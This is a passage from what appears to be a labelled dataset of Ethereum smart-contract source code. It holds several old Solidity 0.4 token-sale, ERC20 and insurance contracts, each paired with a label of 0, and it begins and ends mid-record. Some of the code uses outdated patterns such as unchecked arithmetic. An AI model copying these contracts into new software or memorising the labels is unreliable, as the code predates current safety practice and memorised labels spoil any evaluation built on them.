purchase term\r\r\n    function closeEarlyPurchase()\r\r\n        onlyOwner\r\r\n        returns (bool)\r\r\n    {\r\r\n        earlyPurchaseClosedAt = now;\r\r\n    }\r\r\n\r\r\n    function withdraw(uint withdrawalAmount) onlyOwner {\r\r\n          if(!owner.send(withdrawalAmount)) throw;  \/\/ send collected ETH to SynchroLife team\r\r\n    }\r\r\n\r\r\n    function withdrawAll() onlyOwner {\r\r\n          if(!owner.send(this.balance)) throw;  \/\/ send all collected ETH to SynchroLife team\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address newOwner) onlyOwner {\r\r\n        owner = newOwner;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev By sending Ether to the contract, early purchase will be recorded.\r\r\n    function () payable{\r\r\n        require(msg.value >= WEI_MINIMUM_PURCHASE);\r\r\n        appendEarlyPurchase(msg.sender, msg.value, now);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.16;\r\r\n\r\r\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\r\r\n\r\r\ncontract OysterPrePearl {\r\r\n    \/\/ Public variables of the token\r\r\n    string public name = \"Oyster PrePearl\";\r\r\n    string public symbol = \"PREPRL\";\r\r\n    uint8 public decimals = 18;\r\r\n    uint256 public totalSupply = 0;\r\r\n    uint256 public funds = 0;\r\r\n    address public owner;\r\r\n    bool public saleClosed = false;\r\r\n\r\r\n    \/\/ This creates an array with all balances\r\r\n    mapping (address => uint256) public balanceOf;\r\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\r\n\r\r\n    \/\/ This generates a public event on the blockchain that will notify clients\r\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n\r\r\n    \/\/ This notifies clients about the amount burnt\r\r\n    event Burn(address indexed from, uint256 value);\r\r\n\r\r\n    \/**\r\r\n     * Constructor function\r\r\n     *\r\r\n     * Initializes contract\r\r\n     *\/\r\r\n    function OysterPrePearl() public {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n    \r\r\n    modifier onlyOwner {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n    \r\r\n    function closeSale() onlyOwner {\r\r\n        saleClosed = true;\r\r\n    }\r\r\n\r\r\n    function openSale() onlyOwner {\r\r\n        saleClosed = false;\r\r\n    }\r\r\n    \r\r\n    function () payable {\r\r\n        require(!saleClosed);\r\r\n        require(msg.value >= 100 finney);\r\r\n        require(funds + msg.value <= 2800 ether);\r\r\n        uint buyPrice;\r\r\n        if (msg.value >= 100 ether) {\r\r\n            buyPrice = 17500;\/\/250% bonus\r\r\n        }\r\r\n        else if (msg.value >= 50 ether) {\r\r\n            buyPrice = 12500;\/\/150% bonus\r\r\n        }\r\r\n        else if (msg.value >= 5 ether) {\r\r\n            buyPrice = 10000;\/\/100% bonus\r\r\n        }\r\r\n        else buyPrice = 7500;\/\/50% bonus\r\r\n        uint amount;\r\r\n        amount = msg.value * buyPrice;                    \/\/ calculates the amount\r\r\n        totalSupply += amount;                            \/\/ increases the total supply \r\r\n        balanceOf[msg.sender] += amount;                  \/\/ adds the amount to buyer&#39;s balance\r\r\n        funds += msg.value;                               \/\/ track eth amount raised\r\r\n        Transfer(this, msg.sender, amount);               \/\/ execute an event reflecting the change\r\r\n    }\r\r\n    \r\r\n    function withdrawFunds() onlyOwner {\r\r\n        owner.transfer(this.balance);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Internal transfer, only can be called by this contract\r\r\n     *\/\r\r\n    function _transfer(address _from, address _to, uint _value) internal {\r\r\n        \/\/ Prevent transfer to 0x0 address. Use burn() instead\r\r\n        require(_to != 0x0);\r\r\n        \/\/ Check if the sender has enough\r\r\n        require(balanceOf[_from] >= _value);\r\r\n        \/\/ Check for overflows\r\r\n        require(balanceOf[_to] + _value > balanceOf[_to]);\r\r\n        \/\/ Save this for an assertion in the future\r\r\n        uint previousBalances = balanceOf[_from] + balanceOf[_to];\r\r\n        \/\/ Subtract from the sender\r\r\n        balanceOf[_from] -= _value;\r\r\n        \/\/ Add the same to the recipient\r\r\n        balanceOf[_to] += _value;\r\r\n        Transfer(_from, _to, _value);\r\r\n        \/\/ Asserts are used to use static analysis to find bugs in your code. They should never fail\r\r\n        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfer tokens\r\r\n     *\r\r\n     * Send `_value` tokens to `_to` from your account\r\r\n     *\r\r\n     * @param _to The address of the recipient\r\r\n     * @param _value the amount to send\r\r\n     *\/\r\r\n    function transfer(address _to, uint256 _value) public {\r\r\n        _transfer(msg.sender, _to, _value);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfer tokens from other address\r\r\n     *\r\r\n     * Send `_value` tokens to `_to` in behalf of `_from`\r\r\n     *\r\r\n     * @param _from The address of the sender\r\r\n     * @param _to The address of the recipient\r\r\n     * @param _value the amount to send\r\r\n     *\/\r\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\r\n        require(_value <= allowance[_from][msg.sender]);     \/\/ Check allowance\r\r\n        allowance[_from][msg.sender] -= _value;\r\r\n        _transfer(_from, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Set allowance for other address\r\r\n     *\r\r\n     * Allows `_spender` to spend no more than `_value` tokens in your behalf\r\r\n     *\r\r\n     * @param _spender The address authorized to spend\r\r\n     * @param _value the max amount they can spend\r\r\n     *\/\r\r\n    function approve(address _spender, uint256 _value) public\r\r\n        returns (bool success) {\r\r\n        allowance[msg.sender][_spender] = _value;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Set allowance for other address and notify\r\r\n     *\r\r\n     * Allows `_spender` to spend no more than `_value` tokens in your behalf, and then ping the contract about it\r\r\n     *\r\r\n     * @param _spender The address authorized to spend\r\r\n     * @param _value the max amount they can spend\r\r\n     * @param _extraData some extra information to send to the approved contract\r\r\n     *\/\r\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData)\r\r\n        public\r\r\n        returns (bool success) {\r\r\n        tokenRecipient spender = tokenRecipient(_spender);\r\r\n        if (approve(_spender, _value)) {\r\r\n            spender.receiveApproval(msg.sender, _value, this, _extraData);\r\r\n            return true;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Destroy tokens\r\r\n     *\r\r\n     * Remove `_value` tokens from the system irreversibly\r\r\n     *\r\r\n     * @param _value the amount of money to burn\r\r\n     *\/\r\r\n    function burn(uint256 _value) public returns (bool success) {\r\r\n        require(balanceOf[msg.sender] >= _value);   \/\/ Check if the sender has enough\r\r\n        balanceOf[msg.sender] -= _value;            \/\/ Subtract from the sender\r\r\n        totalSupply -= _value;                      \/\/ Updates totalSupply\r\r\n        Burn(msg.sender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Destroy tokens from other account\r\r\n     *\r\r\n     * Remove `_value` tokens from the system irreversibly on behalf of `_from`.\r\r\n     *\r\r\n     * @param _from the address of the sender\r\r\n     * @param _value the amount of money to burn\r\r\n     *\/\r\r\n    function burnFrom(address _from, uint256 _value) public returns (bool success) {\r\r\n        require(balanceOf[_from] >= _value);                \/\/ Check if the targeted balance is enough\r\r\n        require(_value <= allowance[_from][msg.sender]);    \/\/ Check allowance\r\r\n        balanceOf[_from] -= _value;                         \/\/ Subtract from the targeted balance\r\r\n        allowance[_from][msg.sender] -= _value;             \/\/ Subtract from the sender&#39;s allowance\r\r\n        totalSupply -= _value;                              \/\/ Update totalSupply\r\r\n        Burn(_from, _value);\r\r\n        return true;\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\ncontract IERC20 {\r\r\n    function totalSupply() constant returns (uint256 totalSupply);\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n    \r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\ncontract SHITcoin is IERC20 {\r\r\n    \r\r\n    using SafeMath for uint256;\r\r\n  \r\r\n    string public symbol = &#39;SHT&#39;;\r\r\n\r\r\n    string public name = &#39;SHITcoin&#39;;\r\r\n    \r\r\n    uint8 public constant decimals = 18;\r\r\n    \r\r\n    uint256 public constant tokensPerEther = 1000;\r\r\n    \r\r\n    uint256 public _totalSupply = 99999999000000000000000000;\r\r\n    \r\r\n    \r\r\n    uint256 public totalContribution = 0;\r\r\n    \r\r\n    uint256 public bonusSupply = 0;\r\r\n    \r\r\n    bool public purchasingAllowed = false;\r\r\n    \r\r\n    uint8 public currentSaleDay = 1; \r\r\n    uint8 public currentBonus = 100;\r\r\n    \r\r\n    string public startDate = &#39;2017-09-16 18:00&#39;;\r\r\n    \r\r\n    address public owner;\r\r\n    \r\r\n    modifier onlyOwner {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n    \r\r\n    mapping(address => uint256) balances;\r\r\n    mapping (address => mapping (address => uint256)) public allowed;\r\r\n    \r\r\n    function SHITcoin() {\r\r\n        owner = msg.sender;\r\r\n        balances[msg.sender] = _totalSupply;\r\r\n    }\r\r\n    \r\r\n    function changeStartDate(string _startDate){\r\r\n        require(\r\r\n            msg.sender==owner\r\r\n        );\r\r\n        startDate = _startDate;\r\r\n    }\r\r\n    \r\r\n    function totalSupply() constant returns (uint256 totalSupply) {\r\r\n        return _totalSupply;\r\r\n    }\r\r\n   \r\r\n    function getStats() constant returns (uint256, uint256, uint256,  bool, uint256, uint256, string) {\r\r\n        return (totalContribution, _totalSupply, bonusSupply, purchasingAllowed, currentSaleDay, currentBonus, startDate);\r\r\n    }\r\r\n    \r\r\n    function transferOwnership(address _newOwner) onlyOwner {\r\r\n        owner = _newOwner;\r\r\n    }\r\r\n    \r\r\n     function rebrand(string _symbol, string _name) onlyOwner {\r\r\n        symbol = _symbol;\r\r\n        name   = _name;\r\r\n     }\r\r\n\r\r\n    \r\r\n    function withdraw() onlyOwner {\r\r\n        owner.transfer(this.balance);\r\r\n    }\r\r\n    \/* \r\r\n     * create payable token. Now you can purchase it\r\r\n     *\r\r\n     *\/\r\r\n    function () payable {\r\r\n        require(\r\r\n            msg.value > 0\r\r\n            && purchasingAllowed\r\r\n        );\r\r\n        \/*  everything is in wei *\/\r\r\n        uint256 baseTokens  = msg.value.mul(tokensPerEther);\r\r\n        uint256 bonusTokens = msg.value.mul(currentBonus);\r\r\n        \/* send tokens to buyer. Buyer gets baseTokens + bonusTokens *\/\r\r\n        balances[msg.sender] = balances[msg.sender].add(baseTokens).add(bonusTokens);\r\r\n        \/* send eth to owner *\/\r\r\n        owner.transfer(msg.value);\r\r\n        \r\r\n        bonusSupply       = bonusSupply.add(bonusTokens);\r\r\n        totalContribution = totalContribution.add(msg.value);\r\r\n        _totalSupply      = _totalSupply.add(baseTokens).add(bonusTokens);\r\r\n\r\r\n        Transfer(address(this), msg.sender, baseTokens.add(bonusTokens));\r\r\n    }\r\r\n    \r\r\n    function enablePurchasing() onlyOwner {\r\r\n        purchasingAllowed = true;\r\r\n    }\r\r\n    \r\r\n    function disablePurchasing() onlyOwner {\r\r\n        purchasingAllowed = false;\r\r\n    }\r\r\n    \r\r\n    function setCurrentSaleDayAndBonus(uint8 _day) onlyOwner {\r\r\n        require(\r\r\n            (_day > 0 && _day < 11) \r\r\n        );\r\r\n\r\r\n        currentBonus = 10; \r\r\n        currentSaleDay = _day;\r\r\n\r\r\n        if(_day==1) {\r\r\n            currentBonus = 100;\r\r\n        } \r\r\n        if(_day==2) {\r\r\n            currentBonus = 75;\r\r\n        }\r\r\n        if(_day>=3 && _day<5) {\r\r\n            currentBonus = 50;\r\r\n        }\r\r\n        if(_day>=5 && _day<8) {\r\r\n            currentBonus = 25;\r\r\n        }\r\r\n\r\r\n        \r\r\n    }\r\r\n\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balances[_owner];\r\r\n    }\r\r\n\r\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\r\n        require(\r\r\n            (balances[msg.sender] >= _value)\r\r\n            && (_value > 0)\r\r\n            && (_to != address(0))\r\r\n            && (balances[_to].add(_value) >= balances[_to])\r\r\n            && (msg.data.length >= (2 * 32) + 4)\r\r\n        );\r\r\n\r\r\n        balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n        balances[_to] = balances[_to].add(_value);\r\r\n        Transfer(msg.sender, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\r\n        require(\r\r\n            (allowed[_from][msg.sender] >= _value) \/\/ Check allowance\r\r\n            && (balances[_from] >= _value) \/\/ Check if the sender has enough\r\r\n            && (_value > 0) \/\/ Don&#39;t allow 0value transfer\r\r\n            && (_to != address(0)) \/\/ Prevent transfer to 0x0 address\r\r\n            && (balances[_to].add(_value) >= balances[_to]) \/\/ Check for overflows\r\r\n            && (msg.data.length >= (2 * 32) + 4) \/\/mitigates the ERC20 short address attack\r\r\n            \/\/most of these things are not necesary\r\r\n        );\r\r\n        balances[_from] = balances[_from].sub(_value);\r\r\n        balances[_to] = balances[_to].add(_value);\r\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\r\n        Transfer(_from, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\r\n        \r\r\n        require(\r\r\n            (_value == 0) \r\r\n            || (allowed[msg.sender][_spender] == 0)\r\r\n        );\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n        return allowed[_owner][_spender];\r\r\n    }\r\r\n\r\r\n    \r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\r\r\n\/\/ Interface for contracts with buying functionality, for example, crowdsales.\r\r\ncontract Buyable {\r\r\n  function buy (address receiver) public payable;\r\r\n}\r\r\n\r\r\n \/\/\/ @title Ownable contract - base contract with an owner\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() public {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) public onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n}\r\r\n\r\r\ncontract TokenAdrTokenSaleProxy is Ownable {\r\r\n\r\r\n  \/\/\/ Target contract\r\r\n  Buyable public targetContract;\r\r\n\r\r\n  \/\/\/ Gas limit for buy transaction\r\r\n  uint public buyGasLimit = 200000;\r\r\n\r\r\n  \/\/\/ Is sale stopped or not\r\r\n  bool public stopped = false;\r\r\n\r\r\n  \/\/\/ Total volume of weis passed through this proxy\r\r\n  uint public totalWeiVolume = 0;\r\r\n\r\r\n  \/\/\/ @dev Constructor\r\r\n  \/\/\/ @param _targetAddress Address of the target Buyable contract\r\r\n  function TokenAdrTokenSaleProxy(address _targetAddress) public {\r\r\n    require(_targetAddress > 0);\r\r\n    targetContract = Buyable(_targetAddress);\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Fallback function - forward investment request to the target contract\r\r\n  function() public payable {\r\r\n    require(msg.value > 0);\r\r\n    require(!stopped);\r\r\n    totalWeiVolume += msg.value;\r\r\n    targetContract.buy.value(msg.value).gas(buyGasLimit)(msg.sender);\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Change target address where investment requests are forwarded\r\r\n  \/\/\/ @param newTargetAddress New target address to forward investments\r\r\n  function changeTargetAddress(address newTargetAddress) public onlyOwner {\r\r\n    require(newTargetAddress > 0);\r\r\n    targetContract = Buyable(newTargetAddress);\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Change gas limit for buy() method call\r\r\n  \/\/\/ @param newGasLimit New gas limit\r\r\n  function changeGasLimit(uint newGasLimit) public onlyOwner {\r\r\n    require(newGasLimit > 0);\r\r\n    buyGasLimit = newGasLimit;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Stop the sale\r\r\n  function stop() public onlyOwner {\r\r\n    require(!stopped);\r\r\n    stopped = true;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Resume the sale\r\r\n  function resume() public onlyOwner {\r\r\n    require(stopped);\r\r\n    stopped = false;\r\r\n  }\r\r\n}","label":0}
{"code":"\/**\r\r\r\n *Submitted for verification at Etherscan.io on 2016-09-20\r\r\r\n*\/\r\r\r\n\r\r\r\n\/**\r\r\r\n * \r\r\r\n *\t@title \tFlightDelay contract\r\r\r\n *\t@author\tChristoph Mussenbrock, Stephan Karpischek\r\r\r\n *\t\r\r\r\n *  @brief \tThis is a smart contract modelling the financial compensation of \r\r\r\n *\t\t\tdelayed flights. People can apply for a policy and get automatically \r\r\r\n *\t\t\tpaid in case a plane is late. Probabilities are calculated based on\r\r\r\n *\t\t\tpublic accessible information from http:\/\/www.flightstats.com. \r\r\r\n *\t\t\tReal time flight status information is also pulled from the \r\r\r\n *\t\t\tsame source.\r\r\r\n *\t\t\tA frontend for the contract is running on http:\/\/fdi.etherisc.com.\r\r\r\n *\t\r\r\r\n *\t@copyright (c) 2016 by the authors.\r\r\r\n *\r\r\r\n *\t@remark To view the contract code, you have to scroll down past\r\r\r\n *  \t\tthe imported interfaces. \r\r\r\n * \r\r\r\n *\/\r\r\r\n\r\r\r\n\/**************************************************************************\r\r\r\n *\r\r\r\n *\tOraclize API\r\r\r\n *\r\r\r\n **************************************************************************\/\r\r\r\n \r\r\r\n\/\/ <ORACLIZE_API>\r\r\r\n\/*\r\r\r\nCopyright (c) 2015-2016 Oraclize srl, Thomas Bertani\r\r\r\n\r\r\r\n\r\r\r\n\r\r\r\nPermission is hereby granted, free of charge, to any person obtaining a copy\r\r\r\nof this software and associated documentation files (the \"Software\"), to deal\r\r\r\nin the Software without restriction, including without limitation the rights\r\r\r\nto use, copy, modify, merge, publish, distribute, sublicense, and\/or sell\r\r\r\ncopies of the Software, and to permit persons to whom the Software is\r\r\r\nfurnished to do so, subject to the following conditions:\r\r\r\n\r\r\r\n\r\r\r\n\r\r\r\nThe above copyright notice and this permission notice shall be included in\r\r\r\nall copies or substantial portions of the Software.\r\r\r\n\r\r\r\n\r\r\r\n\r\r\r\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\r\r\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\r\r\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE\r\r\r\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\r\r\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\r\r\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\r\r\r\nTHE SOFTWARE.\r\r\r\n*\/\r\r\r\n\r\r\r\ncontract OraclizeI {\r\r\r\n    address public cbAddress;\r\r\r\n    function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);\r\r\r\n    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) returns (bytes32 _id);\r\r\r\n    function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) returns (bytes32 _id);\r\r\r\n    function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) returns (bytes32 _id);\r\r\r\n    function getPrice(string _datasource) returns (uint _dsprice);\r\r\r\n    function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\r\r\r\n    function useCoupon(string _coupon);\r\r\r\n    function setProofType(byte _proofType);\r\r\r\n    function setCustomGasPrice(uint _gasPrice);\r\r\r\n}\r\r\r\ncontract OraclizeAddrResolverI {\r\r\r\n    function getAddress() returns (address _addr);\r\r\r\n}\r\r\r\ncontract usingOraclize {\r\r\r\n    uint constant day = 60*60*24;\r\r\r\n    uint constant week = 60*60*24*7;\r\r\r\n    uint constant month = 60*60*24*30;\r\r\r\n    byte constant proofType_NONE = 0x00;\r\r\r\n    byte constant proofType_TLSNotary = 0x10;\r\r\r\n    byte constant proofStorage_IPFS = 0x01;\r\r\r\n    uint8 constant networkID_auto = 0;\r\r\r\n    uint8 constant networkID_mainnet = 1;\r\r\r\n    uint8 constant networkID_testnet = 2;\r\r\r\n    uint8 constant networkID_morden = 2;\r\r\r\n    uint8 constant networkID_consensys = 161;\r\r\r\n\r\r\r\n    OraclizeAddrResolverI OAR;\r\r\r\n    \r\r\r\n    OraclizeI oraclize;\r\r\r\n    modifier oraclizeAPI {\r\r\r\n        address oraclizeAddr = OAR.getAddress();\r\r\r\n        if (oraclizeAddr == 0){\r\r\r\n            oraclize_setNetwork(networkID_auto);\r\r\r\n            oraclizeAddr = OAR.getAddress();\r\r\r\n        }\r\r\r\n        oraclize = OraclizeI(oraclizeAddr);\r\r\r\n        _\r\r\r\n    }\r\r\r\n    modifier coupon(string code){\r\r\r\n        oraclize = OraclizeI(OAR.getAddress());\r\r\r\n        oraclize.useCoupon(code);\r\r\r\n        _\r\r\r\n    }\r\r\r\n\r\r\r\n    function oraclize_setNetwork(uint8 networkID) internal returns(bool){\r\r\r\n        if (getCodeSize(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed)>0){\r\r\r\n            OAR = OraclizeAddrResolverI(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed);\r\r\r\n            return true;\r\r\r\n        }\r\r\r\n        if (getCodeSize(0x9efbea6358bed926b293d2ce63a730d6d98d43dd)>0){\r\r\r\n            OAR = OraclizeAddrResolverI(0x9efbea6358bed926b293d2ce63a730d6d98d43dd);\r\r\r\n            return true;\r\r\r\n        }\r\r\r\n        if (getCodeSize(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf)>0){\r\r\r\n            OAR = OraclizeAddrResolverI(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf);\r\r\r\n            return true;\r\r\r\n        }\r\r\r\n        return false;\r\r\r\n    }\r\r\r\n    \r\r\r\n    function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\r\r\r\n        uint price = oraclize.getPrice(datasource);\r\r\r\n        if (price > 1 ether + tx.gasprice*200000) return 0; \/\/ unexpectedly high price\r\r\r\n        return oraclize.query.value(price)(0, datasource, arg);\r\r\r\n    }\r\r\r\n    function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\r\r\r\n        uint price = oraclize.getPrice(datasource);\r\r\r\n        if (price > 1 ether + tx.gasprice*200000) return 0; \/\/ unexpectedly high price\r\r\r\n        return oraclize.query.value(price)(timestamp, datasource, arg);\r\r\r\n    }\r\r\r\n    function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\r\r\r\n        uint price = oraclize.getPrice(datasource, gaslimit);\r\r\r\n        if (price > 1 ether + tx.gasprice*gaslimit) return 0; \/\/ unexpectedly high price\r\r\r\n        return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\r\r\r\n    }\r\r\r\n    function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\r\r\r\n        uint price = oraclize.getPrice(datasource, gaslimit);\r\r\r\n        if (price > 1 ether + tx.gasprice*gaslimit) return 0; \/\/ unexpectedly high price\r\r\r\n        return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\r\r\r\n    }\r\r\r\n    function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\r\r\r\n        uint price = oraclize.getPrice(datasource);\r\r\r\n        if (price > 1 ether + tx.gasprice*200000) return 0; \/\/ unexpectedly high price\r\r\r\n        return oraclize.query2.value(price)(0, datasource, arg1, arg2);\r\r\r\n    }\r\r\r\n    function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\r\r\r\n        uint price = oraclize.getPrice(datasource);\r\r\r\n        if (price > 1 ether + tx.gasprice*200000) return 0; \/\/ unexpectedly high price\r\r\r\n        return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\r\r\r\n    }\r\r\r\n    function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\r\r\r\n        uint price = oraclize.getPrice(datasource, gaslimit);\r\r\r\n        if (price > 1 ether + tx.gasprice*gaslimit) return 0; \/\/ unexpectedly high price\r\r\r\n        return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\r\r\r\n    }\r\r\r\n    function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\r\r\r\n        uint price = oraclize.getPrice(datasource, gaslimit);\r\r\r\n        if (price > 1 ether + tx.gasprice*gaslimit) return 0; \/\/ unexpectedly high price\r\r\r\n        return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\r\r\r\n    }\r\r\r\n    function oraclize_cbAddress() oraclizeAPI internal returns (address){\r\r\r\n        return oraclize.cbAddress();\r\r\r\n    }\r\r\r\n    function oraclize_setProof(byte proofP) oraclizeAPI internal {\r\r\r\n        return oraclize.setProofType(proofP);\r\r\r\n    }\r\r\r\n    function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\r\r\r\n        return oraclize.setCustomGasPrice(gasPrice);\r\r\r\n    }    \r\r\r\n\r\r\r\n    function getCodeSize(address _addr) constant internal returns(uint _size) {\r\r\r\n        assembly {\r\r\r\n            _size := extcodesize(_addr)\r\r\r\n        }\r\r\r\n    }\r\r\r\n\r\r\r\n\r\r\r\n    function parseAddr(string _a) internal returns (address){\r\r\r\n        bytes memory tmp = bytes(_a);\r\r\r\n        uint160 iaddr = 0;\r\r\r\n        uint160 b1;\r\r\r\n        uint160 b2;\r\r\r\n        for (uint i=2; i<2+2*20; i+=2){\r\r\r\n            iaddr *= 256;\r\r\r\n            b1 = uint160(tmp[i]);\r\r\r\n            b2 = uint160(tmp[i+1]);\r\r\r\n            if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\r\r\r\n            else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\r\r\r\n            if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\r\r\r\n            else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\r\r\r\n            iaddr += (b1*16+b2);\r\r\r\n        }\r\r\r\n        return address(iaddr);\r\r\r\n    }\r\r\r\n\r\r\r\n\r\r\r\n    function strCompare(string _a, string _b) internal returns (int) {\r\r\r\n        bytes memory a = bytes(_a);\r\r\r\n        bytes memory b = bytes(_b);\r\r\r\n        uint minLength = a.length;\r\r\r\n        if (b.length < minLength) minLength = b.length;\r\r\r\n        for (uint i = 0; i < minLength; i ++)\r\r\r\n            if (a[i] < b[i])\r\r\r\n                return -1;\r\r\r\n            else if (a[i] > b[i])\r\r\r\n                return 1;\r\r\r\n        if (a.length < b.length)\r\r\r\n            return -1;\r\r\r\n        else if (a.length > b.length)\r\r\r\n            return 1;\r\r\r\n        else\r\r\r\n            return 0;\r\r\r\n   } \r\r\r\n\r\r\r\n    function indexOf(string _haystack, string _needle) internal returns (int)\r\r\r\n    {\r\r\r\n        bytes memory h = bytes(_haystack);\r\r\r\n        bytes memory n = bytes(_needle);\r\r\r\n        if(h.length < 1 || n.length < 1 || (n.length > h.length)) \r\r\r\n            return -1;\r\r\r\n        else if(h.length > (2**128 -1))\r\r\r\n            return -1;                                  \r\r\r\n        else\r\r\r\n        {\r\r\r\n            uint subindex = 0;\r\r\r\n            for (uint i = 0; i < h.length; i ++)\r\r\r\n            {\r\r\r\n                if (h[i] == n[0])\r\r\r\n                {\r\r\r\n                    subindex = 1;\r\r\r\n                    while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\r\r\r\n                    {\r\r\r\n                        